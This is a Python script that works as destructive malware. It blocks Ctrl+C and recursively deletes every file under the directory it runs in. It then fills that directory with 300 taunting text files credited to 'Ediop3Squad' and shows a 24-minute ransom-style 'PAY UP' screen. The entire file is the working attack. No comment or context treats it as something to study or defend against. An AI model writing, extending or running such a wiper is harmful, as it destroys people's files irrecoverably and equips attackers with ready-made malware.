import os
import time
import curses
import signal

def signal_handler(sig, frame):
    """Ignore Ctrl+C interruptions."""
    pass

def delete_files(directory):
    """Delete all files in the specified directory."""
    for root, dirs, files in os.walk(directory):
        for filename in files:
            file_path = os.path.join(root, filename)
            try:
                os.remove(file_path)
                print(f"Deleted file: {file_path}")
            except Exception as e:
                print(f"Error deleting {file_path}: {e}")

def create_files(directory, num_files):
    """Create a specified number of files."""
    for i in range(num_files):
        file_path = os.path.join(directory, f"ediop3Squadgoturpc_{i + 1}.txt")
        with open(file_path, "w") as f:
            f.write("HAHAHAHA U GOT UR ASS WHIPED!\n")
        print(f"Created file: {file_path}")

def spamming_message(win, duration):
    """Display a spamming message for a specified duration."""
    start_time = time.time()
    while time.time() - start_time < duration:
        win.clear()
        win.addstr(0, 5, "HAHAHAH PAY UP! YOUR FILES ARE ALL GETTING DELETED RN", curses.A_BOLD)
        win.refresh()
        time.sleep(0.1)  # Control the speed of the spam effect

def final_message(win):
    """Display the final message after spamming."""
    win.clear()
    win.addstr(0, 5, "HAHAHAH UR PC GOT WHIPED BY Ediop3Squad LEADERRRRRR", curses.A_BOLD | curses.A_UNDERLINE)
    win.refresh()
    time.sleep(5)  # Display for 5 seconds

def main(stdscr):
    # Set up the signal handler
    signal.signal(signal.SIGINT, signal_handler)

    # Specify the directory to delete files from
    directory = '.'  # Change this to your target directory if needed

    # Delete files and create new ones
    delete_files(directory)
    create_files(directory, 300)

    # Start the spamming message for 24 minutes (1440 seconds)
    spamming_message(stdscr, 1440)

    # Show final message
    final_message(stdscr)

if __name__ == "__main__":
    curses.wrapper(main)
